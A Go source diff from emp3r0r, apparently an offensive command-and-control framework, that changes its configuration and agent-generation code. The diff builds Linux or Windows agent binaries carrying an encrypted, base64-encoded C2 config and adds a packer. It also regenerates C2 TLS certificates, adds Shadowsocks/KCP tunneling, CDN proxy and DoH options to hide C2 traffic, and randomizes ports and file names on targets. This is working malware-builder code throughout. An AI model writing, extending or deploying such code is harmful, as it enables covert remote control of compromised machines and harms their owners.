@@ -1,12 +1,16 @@
 package cc
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"os"
 	"strconv"
 	"strings"
+	"time"
 
+	"github.com/bettercap/readline"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -20,8 +24,20 @@ const (
 )
 
 func GenAgent() {
-	stubFile := EmpRoot + "/stub.exe"
-	outfile := EmpRoot + "/agent.exe"
+	now := time.Now()
+	stubFile := EmpBuildDir + "/stub.exe"
+	outfile := fmt.Sprintf("%s/agent_%d-%d-%d_%d-%d-%d.exe",
+		EmpWorkSpace,
+		now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
+
+	os_choice := CliAsk("Generate agent for (1) Linux, (2) Windows: ")
+	if os_choice == "2" {
+		stubFile = EmpBuildDir + "/stub-win.exe"
+		outfile = fmt.Sprintf("%s/agent_windows_%d-%d-%d_%d-%d-%d.exe",
+			EmpWorkSpace,
+			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
+		CliPrintInfo("You chose Windows")
+	}
 
 	if !util.IsFileExist(stubFile) {
 		CliPrintError("%s not found, build it first", stubFile)
@@ -44,11 +60,14 @@ func GenAgent() {
 
 	// encrypt
 	key := tun.GenAESKey(emp3r0r_data.MagicString)
-	encJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
-	if encJSONBytes == nil {
+	encryptedJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
+	if encryptedJSONBytes == nil {
 		CliPrintError("Failed to encrypt %s with key %s", EmpConfigFile, key)
 		return
 	}
+
+	// base64
+	json_data_to_write := base64.StdEncoding.EncodeToString(encryptedJSONBytes)
 
 	// write
 	toWrite, err := ioutil.ReadFile(stubFile)
@@ -56,8 +75,12 @@ func GenAgent() {
 		CliPrintError("Read stub: %v", err)
 		return
 	}
-	toWrite = append(toWrite, []byte(emp3r0r_data.MagicString)...)
-	toWrite = append(toWrite, encJSONBytes...)
+	sep := []byte(strings.Repeat(emp3r0r_data.MagicString, 3))
+
+	// wrap the config data with magic string
+	toWrite = append(toWrite, sep...)
+	toWrite = append(toWrite, []byte(json_data_to_write)...)
+	toWrite = append(toWrite, sep...)
 	err = ioutil.WriteFile(outfile, toWrite, 0755)
 	if err != nil {
 		CliPrintError("Save agent binary %s: %v", outfile, err)
@@ -67,6 +90,25 @@ func GenAgent() {
 	// done
 	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
 		outfile, stubFile, EmpConfigFile, outfile)
+}
+
+// PackAgentBinary pack agent ELF binary with Packer()
+func PackAgentBinary() {
+	// completer
+	compls := []readline.PrefixCompleterInterface{
+		readline.PcItemDynamic(listFiles("./"))}
+	CliCompleter.SetChildren(compls)
+	defer CliCompleter.SetChildren(CmdCompls)
+
+	// ask
+	answ := CliAsk("Path to agent binary: ")
+
+	go func() {
+		err := Packer(answ)
+		if err != nil {
+			CliPrintError("PackAgentBinary: %v", err)
+		}
+	}()
 }
 
 func UpgradeAgent() {
@@ -138,16 +180,16 @@ func PromptForConfig(isAgent bool) (err error) {
 	var ans string
 	if !isAgent {
 		ans = fmt.Sprintf("%v",
-			ask("CC host(s), can be one or more IPs or domain names, separate with space\n"+
-				"NOTE: Only the first host name will be used by agent, the others are ", "cc_host"))
+			ask("CC host(s), can be one or more IPs or domain names, separate with space\n", "cc_host"))
 	} else {
 		ans = fmt.Sprintf("%v",
 			ask("CC host for agent to connect to, can be an IP or a domain name", "cc_host"))
 	}
 	cc_hosts := strings.Fields(ans)
 	RuntimeConfig.CCHost = cc_hosts[0]
+	existing_names := tun.NamesInCert(ServerCrtFile)
 	exists := false
-	for _, c2_name := range cc_hosts {
+	for _, c2_name := range existing_names {
 		if c2_name == RuntimeConfig.CCHost {
 			exists = true
 			break
@@ -157,10 +199,16 @@ func PromptForConfig(isAgent bool) (err error) {
 	if !exists {
 		CliPrintWarning("Name '%s' is not covered by our server cert, re-generating",
 			RuntimeConfig.CCHost)
+		cc_hosts = append(cc_hosts, existing_names...) // append new name
+		// remove old certs
+		os.RemoveAll(ServerCrtFile)
+		os.RemoveAll(ServerKeyFile)
 		err = GenC2Certs(cc_hosts)
 		if err != nil {
 			return fmt.Errorf("GenAgent: failed to generate certs: %v", err)
 		}
+		CliPrintWarning("You will need to restart emp3r0r C2 server to apply name '%s'",
+			RuntimeConfig.CCHost)
 	}
 
 	// if building CC, we can safely ignore varibles below
@@ -170,17 +218,39 @@ func PromptForConfig(isAgent bool) (err error) {
 	if CliYesNo("Enable CDN proxy") {
 		RuntimeConfig.CDNProxy = fmt.Sprintf("%v",
 			ask("CDN proxy, eg. wss://example.com/ws/path", "cdn_proxy"))
+	} else {
+		RuntimeConfig.CDNProxy = ""
+	}
+	if CliYesNo("Enable Shadowsocks proxy " +
+		"(C2 traffic will be encapsulated in Shadowsocks)") {
+		RuntimeConfig.UseShadowsocks = true
+		if CliYesNo("Enable KCP " +
+			"(Shadowsocks traffic will be converted to UDP and go through KCP tunnel)") {
+			RuntimeConfig.UseKCP = true
+		} else {
+			RuntimeConfig.UseKCP = false
+		}
+		RuntimeConfig.UseShadowsocks = true
+	} else {
+		RuntimeConfig.UseShadowsocks = false
+		RuntimeConfig.UseKCP = false
 	}
 	if CliYesNo("Enable agent proxy (for C2 transport)") {
 		RuntimeConfig.AgentProxy = fmt.Sprintf("%v",
 			ask("Agent proxy, eg. socks5://127.0.0.1:1080", "agent_proxy"))
+	} else {
+		RuntimeConfig.AgentProxy = ""
 	}
 	if CliYesNo("Enable DoH (DNS over HTTPS)") {
 		RuntimeConfig.DoHServer = fmt.Sprintf("%v",
 			ask("DoH server, eg. https://1.1.1.1/dns-query", "doh_server"))
+	} else {
+		RuntimeConfig.DoHServer = ""
 	}
 	if !CliYesNo("Enable autoproxy feature (will enable UDP broadcasting)") {
 		RuntimeConfig.BroadcastIntervalMax = 0
+	} else {
+		RuntimeConfig.BroadcastIntervalMax = 120
 	}
 
 	// save emp3r0r.json
@@ -204,6 +274,10 @@ func GenC2Certs(hosts []string) (err error) {
 }
 
 func save_config_json() (err error) {
+	err = loadCA()
+	if err != nil {
+		return fmt.Errorf("save_config_json: %v", err)
+	}
 	w_data, err := json.Marshal(RuntimeConfig)
 	if err != nil {
 		return fmt.Errorf("Saving %s: %v", EmpConfigFile, err)
@@ -218,6 +292,8 @@ func InitConfigFile(cc_host string) (err error) {
 	RuntimeConfig.ProxyPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
 	RuntimeConfig.BroadcastPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
 	RuntimeConfig.SSHDPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
+	RuntimeConfig.ShadowsocksPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
+	RuntimeConfig.KCPPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
 
 	// random strings
 	agent_root := util.RandStr(util.RandInt(6, 20))
@@ -228,6 +304,24 @@ func InitConfigFile(cc_host string) (err error) {
 	RuntimeConfig.SocketName = fmt.Sprintf("%s/%v", RuntimeConfig.AgentRoot, socket)
 	pid_file := util.RandStr(util.RandInt(3, 20))
 	RuntimeConfig.PIDFile = fmt.Sprintf("%s/%v", RuntimeConfig.AgentRoot, pid_file)
+	RuntimeConfig.ShadowsocksPassword = util.RandStr(20)
+
+	// time intervals
+	RuntimeConfig.BroadcastIntervalMin = 30
+	RuntimeConfig.BroadcastIntervalMax = 130
+	RuntimeConfig.IndicatorWaitMin = 30
+	RuntimeConfig.IndicatorWaitMax = 130
 
 	return save_config_json()
+}
+
+func loadCA() error {
+	// CA cert
+	ca_data, err := ioutil.ReadFile(CACrtFile)
+	if err != nil {
+		return fmt.Errorf("failed to read CA cert: %v", err)
+	}
+	tun.CACrt = ca_data
+	RuntimeConfig.CA = string(tun.CACrt)
+	return nil
 }
